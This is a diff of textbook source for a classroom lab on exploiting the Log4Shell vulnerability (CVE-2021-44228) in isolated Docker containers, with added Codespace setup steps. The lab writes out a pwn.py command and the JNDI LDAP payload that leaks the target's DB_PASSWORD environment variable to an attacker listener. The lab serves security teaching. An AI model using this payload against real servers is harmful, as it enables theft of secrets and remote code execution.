@@ -348,16 +348,19 @@
 
 				</section>
 				<section xml:id="lab-exploiting-log4j">
-					<title>Lab: Exploiting log4j</title>
-
+					<title>Lab: Exploiting Log4j</title>
+<introduction>
+	<p>
+		Log4j is a cross-platform logging framework for Java applications, developed by the Apache Software Foundation. It has a history of several versions, one of which introduced a zero-day vulnerability in 2021 known as Log4Shell.
+	</p>
 					<p>
-					In this lab we will examine the log4j vulnerability, 
+					In this lab we will examine the Log4j vulnerability, 
 						<url href="https://nvd.nist.gov/vuln/detail/CVE-2021-44228">CVE-2021-44228</url>. This vulnerability takes advantage of a flaw in a common logging library used by many Java applications, including Apache, neo4j, Steam, iCloud, and Minecraft. Any attacker that can cause a message to be logged can use the Java Naming and Directory Interface (JNDI) and cause the target to reach out to another server, LDAP in our example, and load a remote Java class file. This file can contain any code that the attacker wishes to inject into the server process.
 				
 					</p>
 				<question>
 					<p>
-					Do some research: What versions of log4j are affected by this vulnerability?
+					Do some research: What versions of Log4j are affected by this vulnerability?
 				</p>
 			</question>
 
@@ -369,7 +372,7 @@
 					</p>
 
 					<p>
-					App.java
+					<c>App.java</c>
 				</p>
 
 					<pre>package com.sensepost.log4jpwn;
@@ -415,7 +418,7 @@ public class App {
 					Our attacker container has 
 						<url href="https://github.com/leonjza/log4jpwn/blob/master/pwn.py">the 
 							<c>pwn.py</c> script
-						</url>, also by leonjza, which does two things:
+						</url>, also by leonjza, which does the following things:
 				
 					</p>
 
@@ -444,10 +447,56 @@ public class App {
 						<c>DB_PASSWORD</c>. As it isn’t uncommon to store secrets in environment variables on running containers, this should suffice to see just how devastating this exploit can be.
 				
 					</p>
-
+				</introduction>
+					<subsection xml:id="log4j-codespace">
+						<title>Exploiting log4j in a Github Codespace</title>
+						<p>
+							Go <url href="https://github.com/pearcej/security-log4j">github.com/pearcej/security-log4j</url>. Then:
+							<ol>
+								<li>
+									<p>
+										Fork this codespace into your own Github repository.
+									</p>
+								</li>
+								<li>
+									<p>
+										Navigate to your repository on GitHub.
+									</p>
+								</li>
+								<li>
+									<p>
+										Click the green Code button and select Codespaces.
+									</p>
+								</li>
+								<li>
+									<p>
+										Click "Create codespace on main".
+									</p>
+								</li>
+								<li>
+									<p>
+										Wait for the codespace to be created.
+									</p>
+								</li>
+							</ol>
+						Be sure to either stop or delete this codespace when you are done by clicking the "Stop" button or the "Delete" button in the Codespaces tab of your repository. 
+						</p>
+						<p>
+						Next, jump down to follow the lab directions in <xref ref="log4j-continue" />. 
+						</p>
+					</subsection>
+				<subsection xml:id="log4j-local">
+					<title>Exploiting log4j in a Local Docker installation</title>
 					<p>
 					Start by downloading 
-						<url href="https://github.com/rxt1077/it230/blob/main/labs/log4j.zip?raw=true">the zip archive of this lab</url> and unzipping it in a directory where you have write permissions and can navigate to in a terminal application. Once you’ve done that, you can bring the lab up by typing 
+						<url href="https://github.com/rxt1077/it230/blob/main/labs/log4j.zip?raw=true">the log4j.zip archive of this lab</url> and unzipping it in a directory where you have write permissions and can navigate to in a terminal application. Once you’ve done that, you can continue.
+					</p>
+					</subsection>
+										
+					<subsection xml:id="log4j-continue">
+						<title>Lab Instructions for Exploiting log4j</title>
+					<p>
+						In either container environment, bring the lab up by typing 
 						<c>docker-compose up</c> in that directory. Output should look similar to what you see below:
 				
 					</p>
@@ -481,17 +530,11 @@ log4j-target-1    | [Thread-0] INFO org.eclipse.jetty.server.Server - Started @9
 					<pre>PS C:\Users\rxt1077\it230\labs\log4j&gt; docker-compose run attacker bash
 root@3971c61303c8:/(1)</pre>
 
-					<table>
-						<title></title>
-						<tabular>
-							<row class="odd">
-								<cell halign="left">
-									<term>1</term>
-								</cell>
-								<cell halign="left">Notice how the prompt changes once we are in the container</cell>
-							</row>
-						</tabular>
-					</table>
+					<note>
+						<p>(1) Notice how the prompt changes once we are in the container.
+
+						</p>
+					</note>
 
 					<p>
 					In the attack shell, use the 
@@ -504,62 +547,51 @@ root@3971c61303c8:/(1)</pre>
 					<pre>root@3971c61303c8:/# ip addr show dev eth0
 58: eth0@if59: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default
     link/ether 02:42:ac:14:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
-    inet &lt;IP_ADDRESS&gt;/16 brd 172.20.255.255 scope global eth0 (1)
+    inet &lt;IP_ADDRESS&gt;/16 brd 172.20.255.255 scope global eth0 (2)
        valid_lft forever preferred_lft forever</pre>
 
-					<table>
-						<title></title>
-						<tabular>
-							<row class="odd">
-								<cell halign="left">
-									<term>1</term>
-								</cell>
-								<cell halign="left">You’re IP is 
+					<note><p>(2) Your IP is 
 									<em>not</em>
 									<c>&lt;IP_ADDRESS&gt;</c> it is whatever you find in its place!
-								</cell>
-							</row>
-						</tabular>
-					</table>
+					</p>
+					</note>
 
 					<p>
 					Once you have the IP address, you can run the 
 						<c>pwn.py</c> script on the 
 						<c>attacker</c> container and you should be able to read the 
 						<c>DB_PASSWORD</c> environment variable on the 
-						<c>target</c> container.
+						<c>target</c> container. by typing:
+					<c>python /pwn.py --listen-host &lt;IP_ADDRESS&gt; --exploit-host &lt;IP_ADDRESS&gt;--target http://target:8080 --leak '${env:DB_PASSWORD}' </c>
 				
+					</p><p>
+						You should see something like the following:
 					</p>
 
-					<pre>root@3971c61303c8:/# python /pwn.py --listen-host &lt;IP_ADDRESS&gt; --exploit-host &lt;IP_ADDRESS&gt; --target http://target:8080 --leak '${env:DB_PASSWORD}' (1)
+					<pre>root@3971c61303c8:/# python /pwn.py --listen-host &lt;IP_ADDRESS&gt; --exploit-host &lt;IP_ADDRESS&gt; --target http://target:8080 --leak '${env:DB_PASSWORD}' (3)
  i| starting server on &lt;IP_ADDRESS&gt;:8888
  i| server started
  i| setting payload in User-Agent header
  i| sending exploit payload ${jndi:ldap://&lt;IP_ADDRESS&gt;:8888/${env:DB_PASSWORD}} to http://target:8080/
  i| new connection from &lt;TARGETS_IP&gt;:44050
- v| extracted value: &lt;DB_PASSWORD&gt; (2)
+ v| extracted value: &lt;DB_PASSWORD&gt; (4)
  i| request url was: http://target:8080/
  i| response status code: 200</pre>
 
-					<table>
-						<title></title>
-						<tabular>
-							<row class="odd">
-								<cell halign="left">
-									<term>1</term>
-								</cell>
-								<cell halign="left">Docker Compose will resolve service names to IP addresses so the target URI doesn’t require finding an IP</cell>
-							</row>
-							<row class="even">
-								<cell halign="left">
-									<term>2</term>
-								</cell>
-								<cell halign="left">The value of 
-									<c>DB_PASSWORD</c> can will be here.
-								</cell>
-							</row>
-						</tabular>
-					</table>
+					<note>
+						<p>(3) Docker Compose will resolve service names to IP addresses so the target URI doesn’t require finding an IP.</p>
+							
+					</note>
+					<p>
+						
+					</p>
+							<note>
+								<p>
+									(4) The value of 
+									<c>DB_PASSWORD</c> will be here.
+								</p>
+							</note>
+
 					<question>
 					<p>
 					What is the database password?
@@ -570,7 +602,12 @@ root@3971c61303c8:/(1)</pre>
 					What steps would you take to mitigate the risk of a deployed application having this vulnerability?
 				</p>
 				</question>
-
+										<note>
+						<p>
+							If you chose to use a Github codespace, don't forget to stop or delete the codespace by clicking the "Stop" button or the "Delete" button in the Codespaces tab of your repository.
+						</p>
+						</note>
+			</subsection>
 				</section>
 				<section xml:id="security-solutions-review">
 					<title>Review Questions</title>
